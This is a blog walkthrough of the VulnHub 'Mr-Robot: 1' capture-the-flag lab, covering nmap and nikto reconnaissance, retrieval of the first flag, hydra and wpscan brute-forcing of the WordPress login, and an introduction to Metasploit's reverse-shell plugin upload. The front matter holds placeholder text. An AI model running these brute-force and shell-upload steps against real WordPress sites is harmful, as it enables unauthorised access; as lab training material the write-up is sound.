---
layout: post
title: "Mr. Robot"
date: 2022-04-12 20:50:57 +0200
categories: VulnHub
tags: VulnHub Walkthrough WordPress Nmap Metasploit Tag1 Tag2 Tag3 Tag4 Tag5 Tag6 Tag7 Tag8 Tag9 Tag10
image: "assets/images/binary.jpg"
excerpt: "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Cras nulla nisi, gravida eget lacus sed, feugiat rhoncus lectus. Maecenas condimentum rutrum dolor, ut ultrices risus tempor vel. Mauris sed iaculis elit, id efficitur nulla. Morbi vitae purus et eros venenatis hendrerit quis non nibh. Suspendisse est turpis, ultricies et ipsum et, semper tincidunt ex. Phasellus accumsan enim nec arcu mollis ultricies. Suspendisse congue mi diam, ut auctor turpis faucibus ut."
---

[Mr-Robot: 1](https://www.vulnhub.com/entry/mr-robot-1,151/) has 3 flags to find.

## Preparation

The virtual machines are placed onto the same isolated internal network where they can only communicate with each other.

On the isolated internal network, the VirtualBox DHCP server assigns IP addresses to the machines:

```sh
marci@arch$ vboxmanage dhcpserver add --network=intnet --server-ip=10.38.1.1 --lower-ip=10.38.1.110 --upper-ip=10.38.1.120 --netmask=255.255.255.0 --enable
```

The **Kali** machine received the IP address `10.38.1.110`.

## Enumeration

Launching **Mr. Robot**, we're presented with a login screen that cannot be bypassed as the login credentials aren't known.

![mr_robot](https://www.dropbox.com/s/rftjad3vikt9yyp/mr_robot.jpg?dl=1)


### Nmap

**Nmap** can be used to discover the vulnerable machine on the network:

```sh
kali@kali$ nmap -sS -T4 10.38.1.110-120
```

```sh
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-07 15:04 EDT
Nmap scan report for 10.38.1.110
Host is up (0.0000060s latency).
All 1000 scanned ports on 10.38.1.110 are in ignored states.
Not shown: 1000 closed tcp ports (reset)

Nmap scan report for 10.38.1.111
Host is up (0.00050s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https
MAC Address: 08:00:27:FE:07:51 (Oracle VirtualBox virtual NIC)

Nmap done: 11 IP addresses (2 hosts up) scanned in 32.14 seconds
```

**Nmap** found the vulnerable machine and reported it with the IP address `10.38.1.111`.

Port [80](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=80) and [443](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=443) are well-known ports used to establish connection with **web servers**.

Looking up `10.38.1.111` in a web browser, we're presented with the clone of the promotion website of the [Mr. Robot TV series](https://www.imdb.com/title/tt4158110/).

## First Flag

### Nikto

**Nikto** can be used to gather further information about the web server.

```sh
kali@kali$ nikto -h 10.38.1.111
```

```
+ /admin/index.html: Admin login page/section found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login/: Admin login page/section found.
+ /wordpress: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found
+ /wordpresswp-admin/wp-login.php: Wordpress login found
+ /blog/wp-login.php: Wordpress login found
+ /wp-login.php: Wordpress login found
+ /wordpresswp-login.php: Wordpress login found
+ 7915 requests: 0 error(s) and 19 item(s) reported on remote host
```
**Nikto** has discovered that the server is running an instance of **Wordpress**.

![wordpress](https://www.dropbox.com/s/qfke2r46f8cjcgc/wplogin.jpg?dl=1)

**Nikto** also indicates that the server leaks inodes via ETags and a header has been found with file `/robots.txt`.

```sh
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.38.1.111
+ Target Hostname:    10.38.1.111
+ Target Port:        80
+ Start Time:         2022-04-07 15:29:21 (GMT-4)
---------------------------------------------------------------------------
+
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0.29 0x52467010ef8ad
```

### Robots.txt

> A [robots.txt](https://developers.google.com/search/docs/advanced/robots/intro) file tells search engine crawlers which URLs the crawler can access on your site.
> This is used mainly to avoid overloading your site with requests; it is not a mechanism for keeping a web page out of Google.

`robots.txt` indicates that the server doesn't have an user agent but it has two files:

![robots](https://www.dropbox.com/s/49gd4p8jxetp3tu/robots.jpg?dl=1)

These files can be downloaded with **wget**:

```sh
kali@kali$ wget 10.38.1.111/fsocity.dic
kali@kali$ wget 10.38.1.111/key-1-of-3.txt
```

We can use **cat** to output the content of `key-1-of-3.txt`:

```sh
kali@kali$ cat key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9
```

## Second Flag

As SSL isn't enabled on the Wordpress login page, it may be bruteforced with the previously acquired dictionary file.

`fsocity.dic` contains duplicated entries that should be removed.

```sh
kali@kali$ cat fsocity.dic | sort -u | uniq > wordlist.dic
```

The word count of `fsocity.dic` has decreased from `858160` to `11451`.

```
kali@kali$ wc -l fsocity.dic
858160 fsocity.dic
```

```
kali@kali$ wc -l wordlist.dic
11451 wordlist.dic
```

To start the bruteforce attack, we need to intercept an [http POST request](<https://en.wikipedia.org/wiki/POST_(HTTP)>) in [Burp Suite](https://portswigger.net/burp).

To do that, a manual proxy must be configured in the browser and Burp Suite should have the same Proxy Listener set:

![proxy](https://www.dropbox.com/s/gmy9hh0pjqyqwgz/proxy.jpg?dl=1)

![burpsuite-proxy](https://www.dropbox.com/s/3hbxquuwh8v10ba/burpsuite.jpg?dl=1)

![burpsuite](https://www.dropbox.com/s/a6ay1bq6thlap7m/burpsuite.png?dl=1)

In the intercepted POST request - that has been sent to the server - we're looking for the `log`, `pwd`, and the `wp-submit` fields.

### Hydra

**hydra** can be used to guess the username:

```sh
kali@kali$ hydra -V -L fsocity.dic -p 123 10.38.1.111 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```

- `-V` — Verbose
- `-L fsocity.dic` — Define dictionary
- `-p 123` — Random unique password
- `10.38.1.111` — IP of the vulnerable machine
- `http-post-form` — An http POST form is being bruteforced
- `/wp-login.php` — Path where the login form is located
- `log=^USER^&pwd=^PASS&wp-submit=Log+In` — POST parameters to send, including placeholders
- `F=Invalid Username` — Consider an attempt as failure if the response contains the text "Invalid Username".

```sh
[80][http-post-form] host: 10.38.1.111 login: elliot password: 123
[80][http-post-form] host: 10.38.1.111 login: Elliot password: 123
[80][http-post-form] host: 10.38.1.111 login: ELLIOT password: 123
```

**hydra** has found 3 possible usernames: `elliot`, `Elliot` and `ELLIOT`.

#### Wpscan

**wpscan** can be used to find additional WordPress vulnerabilities and to bruteforce the password using the word list.

```sh
kali@kali$ wpscan --url 10.28.1.111 --passwords /home/kali/mrrobot/wordlist.dic --usernames Elliot
```

```sh
[+] performing password attach on Xmlrpc Multicall against 1 user/s
[SUCCESS] - Elliot - / ER28-0652
All Found
Progress Time: 00:00:19 <========================================================================

[!] Valid Combinations Found:
 | Username: Elliot, Password: ER28-0652
```

**wpscan** has found several outdated plugins and one valid username - password pair.

### Metasploit

**Metasploit** [WordPress Admin Shell Upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) module creates a small WordPress plugin that connects back to the attacking machine and spawns a reverse shell.

```sh
kali@kali$ msfconsole
```
